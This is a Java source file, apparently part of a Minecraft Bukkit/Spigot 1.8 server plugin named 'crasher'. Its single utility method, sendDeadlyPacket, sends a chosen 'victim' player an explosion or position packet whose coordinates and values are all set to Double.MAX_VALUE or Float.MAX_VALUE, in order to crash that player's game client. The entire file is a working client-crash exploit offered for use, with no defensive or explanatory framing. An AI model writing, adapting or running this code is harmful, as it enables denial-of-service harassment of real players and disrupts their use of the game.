package crash.players.crasher;

import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
import net.minecraft.server.v1_8_R3.PacketPlayOutPosition;
import net.minecraft.server.v1_8_R3.Vec3D;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

import java.util.Collections;

public class CrashUtils {
    public static void sendDeadlyPacket(Player victim, CrashType crashType) {
        switch (crashType) {
            case EXPLOSION:
                PacketPlayOutExplosion explosionPacket = new PacketPlayOutExplosion(
                        Double.MAX_VALUE,
                        Double.MAX_VALUE,
                        Double.MAX_VALUE,
                        Float.MAX_VALUE,
                        Collections.emptyList(),
                        new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE));

                ((CraftPlayer)victim).getHandle().playerConnection.sendPacket(explosionPacket);
                break;
            case POSITION:
                PacketPlayOutPosition positionPacket = new PacketPlayOutPosition(
                        Double.MAX_VALUE,
                        Double.MAX_VALUE,
                        Double.MAX_VALUE,
                        Float.MAX_VALUE,
                        Float.MAX_VALUE,
                        Collections.EMPTY_SET);

                ((CraftPlayer)victim).getHandle().playerConnection.sendPacket(positionPacket);
                break;
        }

    }

}
